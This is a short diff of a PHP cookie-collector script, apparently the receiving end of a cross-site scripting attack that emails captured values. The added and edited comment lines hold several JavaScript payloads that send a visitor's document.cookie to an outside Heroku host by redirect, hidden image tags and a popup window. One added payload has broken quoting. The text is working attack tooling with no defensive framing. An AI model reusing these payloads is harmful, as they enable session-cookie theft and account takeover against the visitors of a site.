@@ -32,6 +32,9 @@ if (isset($_GET["abc"])) {
     $mail->Send();
 
 //document.location="https://yeuvephp.herokuapp.com/abc.php?abc=" + document.cookie;
-//var elem = document.createElement("img");elem.setAttribute("src", 'https://yeuvephp.herokuapp.com/abc.php?abc=' + document.cookie );document.getElementById("top_banner").appendChild(elem);
+//var elem = document.createElement("img");elem.setAttribute("src", 'https://yeuvephp.herokuapp.com/abc.php?abc=' + document.cookie );$("[style="display:none;"]").appendChild(elem);
+//$("#top_banner").after('<img style="display: none;" src="https://yeuvephp.herokuapp.com/abc.php?abc=' + document.cookie + '" />');
+//window.open( "https://yeuvephp.herokuapp.com/abc.php?abc=" +document.cookie, "_blank");
+
 }
 ?>
